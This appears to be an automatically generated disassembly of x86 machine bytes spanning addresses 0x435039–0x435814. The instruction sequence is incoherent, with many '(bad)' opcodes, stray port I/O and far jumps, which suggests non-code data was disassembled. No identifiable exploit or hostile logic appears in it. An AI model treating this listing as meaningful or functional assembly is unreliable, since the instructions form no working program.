  435039:	not    BYTE PTR [edi]
  43503b:	les    ecx,FWORD PTR [ecx+0x2b91092f]
  435041:	clc    
  435042:	jmp    0x435085
  435044:	dec    esi
  435045:	add    esp,DWORD PTR [eax+0x10095df7]
  43504b:	aad    0xc9
  43504d:	sbb    al,0x1f
  43504f:	popa   
  435050:	sbb    bh,bl
  435052:	cmp    DWORD PTR [ebp-0x3d106cc],0x75
  435059:	add    dh,BYTE PTR [ebx+edi*4]
  43505c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43505d:	aas    
  43505e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43505f:	pop    ds
  435060:	pop    esi
  435061:	(bad)  
  435062:	xlat   BYTE PTR ds:[ebx]
  435063:	ins    DWORD PTR es:[edi],dx
  435064:	jmp    0x5533:0x3173a05
  43506b:	adc    dl,BYTE PTR [edx-0x6c7bdfb]
  435071:	dec    DWORD PTR [ebp+0x58ec8d07]
  435077:	xchg   ebx,eax
  435078:	xor    cl,BYTE PTR [ebx+0x4834286d]
  43507e:	(bad)  
  43507f:	push   DWORD PTR [esi]
  435081:	stos   BYTE PTR es:[edi],al
  435082:	out    dx,eax
  435083:	stos   BYTE PTR es:[edi],al
  435084:	inc    DWORD PTR [ecx]
  435086:	add    BYTE PTR [edi+0x64be8363],ah
  43508c:	(bad)  
  43508d:	div    BYTE PTR [ecx]
  43508f:	pop    es
  435090:	js     0x435021
  435092:	xchg   ecx,eax
  435093:	xor    DWORD PTR [edi],ebx
  435095:	es push ss
  435097:	jle    0x4350b7
  435099:	add    esi,eax
  43509b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43509c:	ret    0xf387
  43509f:	aam    0xa8
  4350a1:	mov    ds:0x790fb05e,eax
  4350a6:	or     dl,bh
  4350a8:	mov    BYTE PTR [edi],cl
  4350aa:	mov    esp,0x4b832ee3
  4350af:	(bad)  
  4350b0:	outs   dx,BYTE PTR ds:[esi]
  4350b1:	sbb    eax,0x760c97ea
  4350b6:	push   esi
  4350b7:	inc    ecx
  4350b8:	or     BYTE PTR [ecx-0x1c77d425],dh
  4350be:	imul   ebp,DWORD PTR [edx-0x4],0x2fbf2e39
  4350c5:	add    dh,BYTE PTR [edx]
  4350c7:	xchg   esp,eax
  4350c8:	enter  0x54f1,0x9d
  4350cc:	and    ebx,DWORD PTR [edi+0x323a3560]
  4350d2:	and    BYTE PTR [edx-0x28e7461a],al
  4350d8:	scas   eax,DWORD PTR es:[edi]
  4350d9:	and    BYTE PTR [ecx+0x74],ah
  4350dc:	and    DWORD PTR [ebx+0x77],ebx
  4350df:	xchg   ebx,eax
  4350e0:	xchg   BYTE PTR [ebp-0x4e],ch
  4350e3:	push   0x3a
  4350e5:	xchg   ebp,eax
  4350e6:	push   ebp
  4350e7:	aad    0xac
  4350e9:	rol    BYTE PTR ds:0xc6021b64,cl
  4350ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4350f0:	cs or  esp,esp
  4350f3:	ds or  al,0x8
  4350f6:	pusha  
  4350f7:	push   edi
  4350f8:	call   0xc04f4416
  4350fd:	inc    edx
  4350fe:	pop    ds
  4350ff:	(bad)  
  435100:	dec    ecx
  435101:	cmp    al,0xa5
  435103:	dec    ecx
  435104:	pop    esi
  435105:	adc    DWORD PTR [ebp+0x599bdbcc],edi
  43510b:	jno    0x4350e0
  43510d:	(bad)  
  43510e:	ins    DWORD PTR es:[edi],dx
  43510f:	push   ebp
  435110:	mov    eax,ds:0xfea507cd
  435115:	add    ah,BYTE PTR [ebp+0x60f30638]
  43511b:	xor    ecx,DWORD PTR [ecx+0x7]
  43511e:	dec    ebx
  43511f:	pop    ds
  435120:	lock aaa 
  435122:	inc    edx
  435123:	aam    0x97
  435125:	push   edi
  435126:	popa   
  435127:	adc    ecx,DWORD PTR ds:0x888552d7
  43512d:	xor    eax,0xdf4a5af2
  435132:	imul   ch
  435134:	loopne 0x435138
  435136:	ins    BYTE PTR es:[edi],dx
  435137:	dec    esi
  435138:	ss out dx,ax
  43513b:	sub    si,dx
  43513e:	pusha  
  43513f:	adc    DWORD PTR [esi+0x34],edx
  435142:	sub    ah,al
  435144:	cld    
  435145:	repz push esi
  435147:	(bad)  
  435148:	pop    ss
  435149:	dec    edi
  43514a:	push   edi
  43514b:	rcl    esp,1
  43514d:	test   DWORD PTR [esi],0x1fb535cf
  435153:	inc    edi
  435154:	mov    ebp,0x7494c8c5
  435159:	mov    esi,0x8af4d71a
  43515e:	push   edx
  43515f:	fcom   QWORD PTR [eax+0x21]
  435162:	sbb    eax,0xd9b9b23f
  435167:	sbb    al,0x9
  435169:	sub    ebp,edx
  43516b:	dec    edx
  43516c:	jbe    0x4351e8
  43516e:	in     al,0xd5
  435170:	xor    ch,BYTE PTR [eax-0x66]
  435173:	int3   
  435174:	mov    edi,0x89d8fa4d
  435179:	cmp    DWORD PTR [ebx+0x16db00b4],eax
  43517f:	mov    edi,fs
  435181:	add    ch,BYTE PTR [eax-0x53]
  435184:	jbe    0x4351a3
  435186:	mov    ebx,0x615255e5
  43518b:	pop    ebx
  43518c:	push   ebx
  43518d:	push   0x18
  43518f:	jp     0x435181
  435191:	jmp    0x2a816aa6
  435196:	cld    
  435197:	mov    bh,0xb1
  435199:	inc    esp
  43519a:	mov    fs,WORD PTR [edi-0x77]
  43519d:	jmp    0x435183
  43519f:	push   ebp
  4351a0:	xchg   edi,eax
  4351a1:	or     BYTE PTR [esi-0x4b049956],bh
  4351a7:	aad    0x65
  4351a9:	loopne 0x4351ad
  4351ab:	in     al,dx
  4351ac:	sub    ch,BYTE PTR [esi-0x1476f525]
  4351b2:	popa   
  4351b3:	sub    ebx,DWORD PTR [edx+0xa]
  4351b6:	shl    BYTE PTR [bp-0x2e],cl
  4351ba:	push   0xffffffaa
  4351bc:	in     al,dx
  4351bd:	jle    0x435183
  4351bf:	push   edx
  4351c0:	sub    esp,DWORD PTR [edx-0x21b94d24]
  4351c6:	pusha  
  4351c7:	jg     0x43518a
  4351c9:	out    0xd2,eax
  4351cb:	cwde   
  4351cc:	xor    al,0x8
  4351ce:	cdq    
  4351cf:	aad    0xbe
  4351d1:	scas   eax,DWORD PTR es:[edi]
  4351d2:	fwait
  4351d3:	jmp    DWORD PTR [ebp+0x7d]
  4351d6:	mov    al,ds:0xce2d9715
  4351db:	shl    DWORD PTR [edx+0xd2f482],0xfe
  4351e2:	in     al,0xd4
  4351e4:	add    ah,BYTE PTR [edi]
  4351e6:	(bad)  
  4351e7:	adc    DWORD PTR [esi],0x22
  4351ea:	nop
  4351eb:	or     eax,0x7d0b058f
  4351f0:	mov    ds:0xcf642139,al
  4351f5:	cld    
  4351f6:	aaa    
  4351f7:	icebp  
  4351f8:	push   0xfffffff6
  4351fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4351fb:	stos   DWORD PTR es:[edi],eax
  4351fc:	inc    ebp
  4351fd:	and    ch,BYTE PTR [ebx+edi*2-0x1e]
  435201:	mov    ds:0x6ec2b1d3,al
  435206:	(bad)  
  435207:	add    eax,0x4b2a02dd
  43520c:	jcxz   0x43528c
  43520f:	push   eax
  435210:	pop    ss
  435211:	add    esi,DWORD PTR [edx-0x2a]
  435214:	cmp    al,0x16
  435216:	push   ebx
  435217:	das    
  435218:	fcom   QWORD PTR [edx+0x1e]
  43521b:	or     eax,0x8ba6c550
  435220:	and    dl,BYTE PTR ss:[eax]
  435223:	aam    0x7c
  435225:	jmp    0x4351f0
  435227:	push   esi
  435228:	in     al,dx
  435229:	(bad)  
  43522a:	push   ebx
  43522b:	cwde   
  43522c:	mov    BYTE PTR [ebx],dh
  43522e:	mov    ah,0x74
  435230:	dec    esp
  435231:	push   edi
  435232:	sar    DWORD PTR [ecx+0x6a1805a3],cl
  435238:	jmp    0xfadff6ea
  43523d:	pop    edx
  43523e:	push   ds
  43523f:	add    DWORD PTR ds:0xdec5fc72,ebp
  435245:	ror    BYTE PTR [ecx+edi*8-0x5af1a9ca],0x59
  43524d:	add    al,BYTE PTR [esi-0x2806a009]
  435253:	adc    esi,DWORD PTR [esi+0x93fe057]
  435259:	dec    edi
  43525a:	jge    0x4352bb
  43525c:	or     al,0x2d
  43525e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43525f:	aam    0x26
  435261:	mov    bh,0x47
  435263:	sahf   
  435264:	push   es
  435265:	fmul   QWORD PTR [ecx]
  435267:	test   BYTE PTR [ecx-0x67],ch
  43526a:	add    dh,BYTE PTR [edx]
  43526c:	mov    BYTE PTR [ebp-0x7dbcfa16],bl
  435272:	fadd   QWORD PTR [esi+0x6e]
  435275:	add    al,BYTE PTR [eax-0x39]
  435278:	adc    BYTE PTR [ebx],0xa
  43527b:	pop    esp
  43527c:	jno    0x435245
  43527e:	jnp    0x4352a7
  435280:	rol    BYTE PTR [esi-0x40],1
  435283:	cmp    esp,ebp
  435285:	inc    edx
  435286:	and    BYTE PTR [edx],0x2e
  435289:	fbstp  TBYTE PTR [ebp-0x2b]
  43528c:	inc    ecx
  43528d:	sti    
  43528e:	push   edx
  43528f:	xchg   esi,eax
  435290:	dec    DWORD PTR [ebx]
  435292:	ror    BYTE PTR [ebp+0x6765135d],0xf8
  435299:	imul   ecx,DWORD PTR [eax-0x52],0x3302c37b
  4352a0:	push   ds
  4352a1:	add    al,BYTE PTR [edx-0x482d05ef]
  4352a7:	push   ebp
  4352a8:	inc    ebp
  4352a9:	inc    esi
  4352aa:	push   ds
  4352ab:	pop    es
  4352ac:	fcomi  st,st(0)
  4352ae:	pop    ss
  4352af:	pop    ebx
  4352b0:	jmp    0x19:0x3bc42528
  4352b7:	jecxz  0x43532b
  4352b9:	call   0xf44e:0x6108e04d
  4352c0:	arpl   WORD PTR [edx+edi*2],dx
  4352c3:	enter  0xe3e3,0x75
  4352c7:	aam    0x52
  4352c9:	shl    DWORD PTR [edi],0x65
  4352cc:	mov    DWORD PTR [edi+0x60],edx
  4352cf:	fwait
  4352d0:	inc    ebp
  4352d1:	clc    
  4352d2:	outs   dx,BYTE PTR ds:[esi]
  4352d3:	sbb    BYTE PTR [edi],0x2
  4352d6:	sbb    ah,ch
  4352d8:	ror    BYTE PTR [ecx-0xe3cafdc],1
  4352de:	adc    ebp,ecx
  4352e0:	mov    BYTE PTR [edi],cl
  4352e2:	sub    BYTE PTR [edi],dl
  4352e4:	or     DWORD PTR [esi+0x37],0x6e05e8fa
  4352eb:	dec    esp
  4352ec:	into   
  4352ed:	push   edi
  4352ee:	(bad)  
  4352ef:	lods   al,BYTE PTR ds:[esi]
  4352f0:	lock cli 
  4352f2:	push   ds
  4352f3:	push   ss
  4352f4:	mov    DWORD PTR [ebp-0x52],edi
  4352f7:	cmp    al,dl
  4352f9:	js     0x435289
  4352fb:	push   esp
  4352fc:	push   esi
  4352fd:	add    ch,BYTE PTR [eax-0x65]
  435300:	loopne 0x435286
  435302:	and    eax,0x1e5c73cf
  435307:	mov    DWORD PTR [ebp+0x1c43b460],esi
  43530d:	pushf  
  43530e:	nop
  43530f:	mov    ebx,0x8f68c733
  435314:	push   es
  435315:	(bad)  
  435316:	not    ebp
  435318:	inc    ebx
  435319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43531a:	adc    eax,0x135f89c5
  43531f:	in     eax,dx
  435320:	pop    ds
  435321:	repz in al,0xf4
  435324:	dec    edx
  435325:	add    ebp,DWORD PTR [ebp+ecx*4+0x7]
  435329:	outs   dx,DWORD PTR ds:[esi]
  43532a:	stos   BYTE PTR es:[edi],al
  43532b:	daa    
  43532c:	or     DWORD PTR fs:[edx],esi
  43532f:	fist   WORD PTR [ecx]
  435331:	push   ss
  435332:	push   ds
  435333:	icebp  
  435334:	or     al,0xa1
  435336:	enter  0xea70,0xaf
  43533a:	hlt    
  43533b:	aam    0xc8
  43533d:	add    ebx,edi
  43533f:	jns    0x435398
  435341:	add    DWORD PTR [esi],edx
  435343:	push   es
  435344:	xchg   BYTE PTR [ebp+0x6],dl
  435347:	push   eax
  435348:	jbe    0x435330
  43534a:	inc    eax
  43534b:	leave  
  43534c:	sti    
  43534d:	push   edx
  43534e:	rcr    DWORD PTR [ecx+0x4d],0x76
  435352:	push   ds
  435353:	addr16 mov esp,0x149b4119
  435359:	mov    ebp,0xa2f10560
  43535e:	sbb    bh,0xa8
  435361:	ror    BYTE PTR [esi+0x595439ba],1
  435367:	mov    edi,0xc82c6e08
  43536c:	addr16 ror bh,0x8d
  435370:	cmp    DWORD PTR ds:0xaf9130b8,ebx
  435376:	popf   
  435377:	test   BYTE PTR [edx+edi*2],cl
  43537a:	out    dx,al
  43537b:	aam    0x38
  43537d:	or     ah,0x4c
  435380:	push   ds
  435381:	aad    0x6a
  435383:	outs   dx,BYTE PTR ds:[esi]
  435384:	mov    eax,0x6868446d
  435389:	cmp    esp,DWORD PTR [ecx]
  43538b:	fwait
  43538c:	push   esi
  43538d:	inc    edi
  43538e:	daa    
  43538f:	push   edi
  435390:	xor    eax,0xfe8a8421
  435395:	adc    al,0x1f
  435397:	not    DWORD PTR [ebx]
  435399:	jo     0x43534c
  43539b:	scas   eax,DWORD PTR es:[edi]
  43539c:	sub    eax,0x2f1d7ae9
  4353a1:	gs pop ds
  4353a3:	fistp  QWORD PTR [eax*4-0x622804da]
  4353aa:	mov    dl,al
  4353ac:	sub    DWORD PTR [ebp+0x58c4158e],esp
  4353b2:	in     eax,0xd5
  4353b4:	sbb    eax,DWORD PTR [eax]
  4353b6:	cmp    BYTE PTR [edi-0x7d],ah
  4353b9:	adc    DWORD PTR [ecx],0xe9d38971
  4353bf:	popa   
  4353c0:	ror    DWORD PTR [edx+0x0],1
  4353c3:	fcmove st,st(0)
  4353c5:	add    eax,0x9a6c26b4
  4353ca:	inc    esp
  4353cb:	and    dl,bl
  4353cd:	into   
  4353ce:	popa   
  4353cf:	in     eax,dx
  4353d0:	jecxz  0x4353fd
  4353d2:	cs inc ecx
  4353d4:	push   ebx
  4353d5:	jmp    0x4353a7
  4353d7:	or     al,0x7e
  4353d9:	add    bh,BYTE PTR [esi]
  4353db:	push   0xe03a0847
  4353e0:	mov    dl,0xc3
  4353e2:	xchg   esi,eax
  4353e3:	cmp    DWORD PTR [edx+0xc],ebx
  4353e6:	pop    ds
  4353e7:	mov    cl,0x6e
  4353e9:	sub    DWORD PTR [ecx],eax
  4353eb:	ins    DWORD PTR es:[edi],dx
  4353ec:	mov    esp,0x83d48769
  4353f1:	loop   0x435463
  4353f3:	mov    eax,0xaa15b2c1
  4353f8:	mov    BYTE PTR [ebp-0x5537edb],ah
  4353fe:	cmp    BYTE PTR [ecx+0x18],dl
  435401:	add    esp,esi
  435403:	mov    bl,0x4c
  435405:	retf   
  435406:	lahf   
  435407:	jne    0x435419
  435409:	sbb    ecx,DWORD PTR [esi]
  43540b:	or     cl,BYTE PTR [ecx+0x4716d887]
  435411:	sub    eax,0x2e02007
  435416:	lods   al,BYTE PTR ds:[esi]
  435417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435418:	mov    DWORD PTR [esi],edx
  43541a:	das    
  43541b:	lods   eax,DWORD PTR ds:[esi]
  43541c:	dec    ebp
  43541d:	in     al,dx
  43541e:	pusha  
  43541f:	cmp    DWORD PTR [edi],eax
  435421:	stos   BYTE PTR es:[edi],al
  435422:	push   esi
  435423:	sbb    eax,0xd594cc10
  435428:	jno    0x4353f9
  43542a:	xor    DWORD PTR ds:[eax-0x76e8410d],eax
  435431:	popa   
  435432:	jbe    0x435452
  435434:	pop    ebp
  435435:	pop    edi
  435436:	call   0x76d9:0x62109bf9
  43543d:	scas   al,BYTE PTR es:[edi]
  43543e:	jnp    0x435460
  435440:	or     DWORD PTR [eax],ebp
  435442:	into   
  435443:	cmp    eax,0xd60e5e7
  435448:	sbb    edx,DWORD PTR [edx-0x7469899f]
  43544e:	loopne 0x4353da
  435450:	loopne 0x4353ea
  435452:	push   edi
  435453:	aam    0x6b
  435455:	aam    0x7b
  435457:	repz inc ebp
  435459:	in     eax,0x1f
  43545b:	imul   ecx,eax,0xcb26eff5
  435461:	js     0x435460
  435463:	pop    ecx
  435464:	fimul  DWORD PTR [esi+0x2795601f]
  43546a:	mov    dl,BYTE PTR [ebp+esi*8-0x25]
  43546e:	sti    
  43546f:	dec    ebx
  435470:	dec    ecx
  435471:	loope  0x435437
  435473:	pop    esi
  435474:	ja     0x4354d3
  435476:	jge    0x4354b3
  435478:	jecxz  0x4354dd
  43547a:	pop    esi
  43547b:	aas    
  43547c:	and    al,0x93
  43547e:	xor    al,0xed
  435480:	mov    cl,0xc9
  435482:	inc    eax
  435483:	bound  esi,QWORD PTR [ebp+0x1b8d1f80]
  435489:	xor    ebx,esp
  43548b:	cmp    edi,edx
  43548d:	aad    0xa
  43548f:	xlat   BYTE PTR ds:[ebx]
  435490:	pop    esp
  435491:	inc    DWORD PTR [eax-0x3f]
  435494:	das    
  435495:	push   edi
  435496:	cli    
  435497:	mov    eax,0xb993eb88
  43549c:	jg     0x4354a4
  43549e:	cwde   
  43549f:	scas   al,BYTE PTR es:[edi]
  4354a0:	xchg   ecx,eax
  4354a1:	add    eax,0x39780f70
  4354a6:	lds    ebx,FWORD PTR [ebx+ebx*2]
  4354a9:	add    BYTE PTR [esi],bl
  4354ab:	daa    
  4354ac:	jmp    0xacc1690d
  4354b1:	sub    edx,edx
  4354b3:	aad    0xe4
  4354b5:	sti    
  4354b6:	not    BYTE PTR [ebx]
  4354b8:	shr    BYTE PTR [eax],1
  4354ba:	std    
  4354bb:	push   esi
  4354bc:	mov    BYTE PTR [ebp+0x59],al
  4354bf:	cmc    
  4354c0:	push   es
  4354c1:	add    eax,0x8617bc88
  4354c6:	mov    ebp,0xebe5972b
  4354cb:	jno    0x435513
  4354cd:	in     eax,0x52
  4354cf:	dec    ebx
  4354d0:	test   ecx,0xa00904a2
  4354d6:	xor    BYTE PTR [edi-0x4947c77],bh
  4354dc:	push   ss
  4354dd:	(bad)  
  4354de:	fadd   st,st(3)
  4354e0:	jmp    0x4354db
  4354e2:	inc    edi
  4354e3:	mul    DWORD PTR [ebp-0x553f4d0e]
  4354e9:	sub    DWORD PTR [edx],edi
  4354eb:	push   edx
  4354ec:	fnstenv [edi+0x71d4cc60]
  4354f2:	imul   esp,DWORD PTR [ebp-0x78],0x73
  4354f6:	inc    ecx
  4354f7:	cmp    al,0x17
  4354f9:	shr    BYTE PTR [eax-0x37144fe5],cl
  4354ff:	retf   0x5ca
  435502:	ficom  DWORD PTR [ebp-0x7f9e9098]
  435508:	mov    edx,0xcc051e1c
  43550d:	mov    ebx,0xec821362
  435512:	push   0xffffffd5
  435514:	cmp    edi,DWORD PTR [edi+0x59c884db]
  43551a:	scas   al,BYTE PTR es:[edi]
  43551b:	xchg   DWORD PTR [ecx+0x16a2e3e3],ecx
  435521:	mov    edx,0xf2bc9e40
  435526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435527:	adc    al,0x6
  435529:	add    eax,DWORD PTR [edx-0x1e5cbc89]
  43552f:	call   0xc770:0x447fa90d
  435536:	pusha  
  435537:	inc    ecx
  435538:	xor    BYTE PTR [ebx-0x53a7ee4b],cl
  43553e:	mov    ds:0xeb9071a7,eax
  435543:	mov    ecx,0xd4bf8183
  435548:	shr    BYTE PTR [ecx],0x38
  43554b:	jo     0x4354d6
  43554d:	jae    0x4354ed
  43554f:	dec    ecx
  435550:	lods   eax,DWORD PTR ds:[esi]
  435551:	pop    es
  435552:	xchg   ebx,eax
  435553:	fdivr  QWORD PTR [edx]
  435555:	add    ebp,esi
  435557:	inc    edx
  435558:	(bad)  
  435559:	or     DWORD PTR [ecx+0x4b],esp
  43555c:	cmc    
  43555d:	neg    BYTE PTR [edi]
  43555f:	jno    0x435569
  435561:	xchg   esp,eax
  435562:	ds sahf 
  435564:	jmp    0xd390270
  435569:	retf   
  43556a:	pop    ebx
  43556b:	lahf   
  43556c:	mov    DWORD PTR [ebp-0x5576e542],edx
  435572:	mov    cl,0x64
  435574:	mov    DWORD PTR [edi],esp
  435576:	mov    ah,BYTE PTR [ecx]
  435578:	outs   dx,DWORD PTR ds:[esi]
  435579:	dec    edx
  43557a:	jg     0x43550d
  43557c:	jb     0x43558a
  43557e:	jns    0x435555
  435580:	and    BYTE PTR [eax],bl
  435582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435583:	out    0x34,eax
  435585:	inc    edi
  435586:	pusha  
  435587:	pop    esi
  435588:	mov    BYTE PTR [ecx],dh
  43558a:	into   
  43558b:	loope  0x435604
  43558d:	push   0x17b83ab
  435592:	hlt    
  435593:	sbb    eax,0x4adeecc6
  435598:	mov    ch,0x9d
  43559a:	mov    ah,0xb4
  43559c:	mov    BYTE PTR [edi-0x4e49b1cb],al
  4355a2:	push   ebx
  4355a3:	aas    
  4355a4:	nop
  4355a5:	add    eax,0x498517b2
  4355aa:	lods   eax,DWORD PTR ds:[esi]
  4355ab:	test   eax,0x8c012ebf
  4355b0:	call   0x4b03:0x3b8d5ba1
  4355b7:	inc    ebp
  4355b8:	jle    0x4355ee
  4355ba:	into   
  4355bb:	aam    0xf3
  4355bd:	ins    DWORD PTR es:[edi],dx
  4355be:	fdivr  DWORD PTR [edx+ebp*4-0x7699d7d9]
  4355c5:	sbb    eax,0x9e6686
  4355ca:	pusha  
  4355cb:	dec    edx
  4355cc:	mov    al,ds:0x1e5d8a05
  4355d1:	inc    eax
  4355d2:	ins    BYTE PTR es:[edi],dx
  4355d3:	shl    bl,cl
  4355d5:	ss je  0x435607
  4355d8:	sbb    ebx,DWORD PTR [edi]
  4355da:	sub    ecx,edx
  4355dc:	stos   BYTE PTR es:[edi],al
  4355dd:	in     al,dx
  4355de:	dec    ebx
  4355df:	jmp    0x3c1:0x58576376
  4355e6:	pop    edx
  4355e7:	mov    ch,dh
  4355e9:	lea    esi,[ecx+0x40ec7053]
  4355ef:	push   0xffffffb3
  4355f1:	es cdq 
  4355f3:	xchg   ebx,eax
  4355f4:	mov    ebx,0x244cf602
  4355f9:	cwde   
  4355fa:	popa   
  4355fb:	jbe    0x435581
  4355fd:	gs cmp eax,0x49c969d7
  435603:	stc    
  435604:	dec    ebp
  435605:	lods   al,BYTE PTR ds:[esi]
  435606:	out    0x34,al
  435608:	mov    DWORD PTR [ebp+0x3ccc81f6],esp
  43560e:	inc    esi
  43560f:	sbb    eax,0x7d2e3f7d
  435614:	enter  0x6402,0x87
  435618:	aam    0xcb
  43561a:	pop    ss
  43561b:	and    eax,0xc3d38f89
  435620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435621:	sub    bl,BYTE PTR [ecx+0x5ff6624]
  435627:	aam    0x53
  435629:	and    al,0xe6
  43562b:	sbb    DWORD PTR [ebx],0x70
  43562e:	shr    DWORD PTR [esi-0x5dbe8678],cl
  435634:	dec    esp
  435635:	and    BYTE PTR [ebx+edi*1+0x40bc0289],dl
  43563c:	(bad)  
  43563d:	adc    BYTE PTR ds:0x60cd2d3d,ah
  435643:	(bad)  
  435644:	lea    ebx,[ecx-0x6f30e97d]
  43564a:	stos   DWORD PTR es:[edi],eax
  43564b:	hlt    
  43564c:	xor    al,0x0
  43564e:	mov    al,0xe0
  435650:	adc    edx,DWORD PTR [edx]
  435652:	leave  
  435653:	cmp    esi,ecx
  435655:	cmc    
  435656:	pop    eax
  435657:	xor    al,0x59
  435659:	fwait
  43565a:	pop    ds
  43565b:	xchg   edi,eax
  43565c:	arpl   WORD PTR [ebx+0x1fa4dbd0],sp
  435662:	pop    esp
  435663:	aam    0x99
  435665:	inc    esp
  435666:	ss je  0x435631
  435669:	xchg   DWORD PTR [ebx],edi
  43566b:	adc    BYTE PTR [esi-0x77a47299],dh
  435671:	int3   
  435672:	push   edx
  435673:	jb     0x43569e
  435675:	shr    dl,1
  435677:	and    al,0xfe
  435679:	ins    BYTE PTR es:[edi],dx
  43567a:	push   ds
  43567b:	xchg   edi,eax
  43567c:	lahf   
  43567d:	mov    ch,0x60
  43567f:	or     ah,BYTE PTR [eax-0x34]
  435682:	arpl   WORD PTR [ebp+0x1c646a9b],si
  435688:	and    DWORD PTR [ebx+0x27c3b524],eax
  43568e:	dec    edx
  43568f:	mov    ch,0xa2
  435691:	test   al,0x9f
  435693:	pop    edi
  435694:	add    eax,ecx
  435696:	pushf  
  435697:	popa   
  435698:	mov    dh,0x7
  43569a:	mov    ch,0x81
  43569c:	or     edx,edx
  43569e:	in     eax,dx
  43569f:	adc    dl,ah
  4356a1:	adc    DWORD PTR [edi],esi
  4356a3:	rol    BYTE PTR [edi+0x2f090684],cl
  4356a9:	cmp    al,0x2e
  4356ab:	cmp    eax,0x2d1f6db9
  4356b0:	mov    cl,0x51
  4356b2:	mov    esp,0xb89778a5
  4356b7:	ror    DWORD PTR [edi+0x3c275829],0xbf
  4356be:	loopne 0x43565a
  4356c0:	jne    0x435700
  4356c2:	add    DWORD PTR [esi],0xb1290f89
  4356c8:	test   BYTE PTR [edx-0x35],dh
  4356cb:	std    
  4356cc:	out    0x2,eax
  4356ce:	fsubp  st(3),st
  4356d0:	sar    BYTE PTR gs:[esi+0x60b8d9c4],cl
  4356d7:	jmp    0xb8d8b42f
  4356dc:	push   cs
  4356dd:	nop
  4356de:	push   es
  4356df:	(bad)  
  4356e0:	dec    ebp
  4356e1:	fisubr DWORD PTR es:0xfcb2d82c
  4356e8:	out    dx,eax
  4356e9:	jmp    0xbc8b580d
  4356ee:	icebp  
  4356ef:	xor    esp,DWORD PTR [esi-0x622a7b3e]
  4356f5:	out    dx,al
  4356f6:	scas   eax,DWORD PTR es:[edi]
  4356f7:	popa   
  4356f8:	fwait
  4356f9:	pop    edi
  4356fa:	fs jnp 0x435686
  4356fd:	aad    0x23
  4356ff:	aas    
  435700:	sub    al,al
  435702:	mov    edi,0x8017c2e8
  435707:	sub    al,0x0
  435709:	push   esp
  43570a:	fist   DWORD PTR ds:0x1612ff30
  435710:	push   0xffffffb6
  435712:	(bad)  
  435713:	(bad)  
  435715:	cmp    edi,DWORD PTR [esi+0x25]
  435718:	and    DWORD PTR [ebp+0x26],edx
  43571b:	pop    edi
  43571c:	fld    QWORD PTR [edx]
  43571e:	clc    
  43571f:	xor    eax,0xc20b95fc
  435724:	dec    edx
  435725:	inc    ecx
  435726:	pop    ds
  435727:	lahf   
  435728:	sub    ebx,DWORD PTR [edi+edi*2+0x3c]
  43572c:	inc    ecx
  43572d:	and    eax,0xd0940723
  435732:	push   ds
  435733:	inc    esp
  435734:	sub    ah,bl
  435736:	jne    0x43570c
  435738:	mov    dh,0x6e
  43573a:	imul   ebx,esi,0x8997d72a
  435740:	mov    esp,DWORD PTR [ebp-0x45dcb5e1]
  435746:	cmp    al,0x8a
  435748:	jo     0x43572b
  43574a:	adc    edi,edx
  43574c:	or     ecx,ecx
  43574e:	pop    esi
  43574f:	outs   dx,DWORD PTR ds:[esi]
  435750:	retf   
  435751:	push   cs
  435752:	clc    
  435753:	(bad)  
  435754:	cld    
  435755:	not    DWORD PTR ds:0x41b988f3
  43575b:	retf   0x32d0
  43575e:	pop    edx
  43575f:	mov    dl,BYTE PTR [edx-0x68fc5ffe]
  435765:	mov    ah,0x54
  435767:	sbb    bl,bl
  435769:	ja     0x43578d
  43576b:	dec    DWORD PTR [eax+0x12bc7403]
  435771:	push   edi
  435772:	test   BYTE PTR [edi],al
  435774:	xor    al,0x46
  435776:	ins    BYTE PTR es:[edi],dx
  435777:	cmp    eax,0x6bea98b0
  43577c:	ret    
  43577d:	adc    BYTE PTR [eax+0x66b5537e],0xcb
  435784:	xchg   ecx,eax
  435785:	push   eax
  435786:	or     edi,ebx
  435788:	out    0x72,al
  43578a:	sbb    DWORD PTR [ebx],edi
  43578c:	mov    ah,0x6
  43578e:	pop    esp
  43578f:	mov    ebx,0xdbaaf9b9
  435794:	adc    al,0xd1
  435796:	outs   dx,BYTE PTR ds:[esi]
  435797:	jnp    0x4357ea
  435799:	mov    ebp,0x14a96215
  43579e:	jp     0x435801
  4357a0:	xchg   esp,eax
  4357a1:	mov    bh,0xb8
  4357a3:	test   DWORD PTR [esp+eiz*2-0x6d3d6fdb],ebp
  4357aa:	push   ds
  4357ab:	push   edi
  4357ac:	and    BYTE PTR [edi],dl
  4357ae:	mov    dh,0xd4
  4357b0:	or     DWORD PTR [eax+0x2c070fcb],0xffffff9c
  4357b7:	xchg   ebp,eax
  4357b8:	hlt    
  4357b9:	sub    DWORD PTR [ebx-0x260c763d],0x43
  4357c0:	adc    eax,0x479eac8b
  4357c5:	add    cl,BYTE PTR [esi+0x219f2e60]
  4357cb:	cmp    eax,0x5f6db2ee
  4357d0:	cli    
  4357d1:	mov    esi,0x1bc7d396
  4357d6:	lahf   
  4357d7:	jns    0x4357f6
  4357d9:	clc    
  4357da:	sbb    dh,bl
  4357dc:	xrelease xchg DWORD PTR [ecx+0x4a],edx
  4357e0:	xchg   edi,eax
  4357e1:	jb     0x43584a
  4357e3:	adc    cl,al
  4357e5:	repz pop ebp
  4357e7:	sbb    dl,BYTE PTR [eax-0x24]
  4357ea:	lods   al,BYTE PTR ds:[esi]
  4357eb:	push   ebp
  4357ec:	fstp   DWORD PTR [edx+0x7b]
  4357ef:	xor    eax,0xd708ac7e
  4357f4:	bound  edx,QWORD PTR [ebx+eiz*1-0x67fdc557]
  4357fb:	repnz adc eax,0x19d84e3b
  435801:	fcomp  QWORD PTR [edi]
  435803:	gs (bad) 
  435805:	xchg   ebx,eax
  435806:	or     bh,BYTE PTR ds:[ebx+ebx*2+0x1634d432]
  43580e:	leave  
  43580f:	mov    dl,0x9d
  435811:	mov    dh,0x89
  435813:	(bad)  
  435814:	mov    al,0x3d
